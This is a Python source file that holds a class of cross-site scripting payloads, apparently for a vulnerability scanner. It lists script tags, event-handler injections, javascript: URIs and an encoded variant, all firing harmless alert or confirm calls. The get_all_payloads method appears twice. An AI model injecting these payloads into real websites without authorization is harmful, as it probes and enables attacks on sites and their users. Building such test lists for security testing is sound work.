"""
XSS payloads for testing Cross-Site Scripting vulnerabilities
"""

class XSSPayloads:
    """XSS payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic XSS payloads"""
        return [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            # Additional basic payloads for better coverage
            '<script>alert(1)</script>',
            '<img src=1 onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<script>confirm(1)</script>',
            '<img src="" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<iframe src=javascript:alert(1)>'
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced XSS payloads"""
        return [
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg/onload=alert(/XSS/)>',
            '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            '<input type="image" src="x" onerror="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src="x" onerror="alert(\'XSS\')">'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all XSS payloads"""
        return XSSPayloads.get_basic_payloads() + XSSPayloads.get_advanced_payloads()
    @staticmethod
    def get_all_payloads():
        """Get all XSS payloads"""
        return XSSPayloads.get_basic_payloads() + XSSPayloads.get_advanced_payloads()
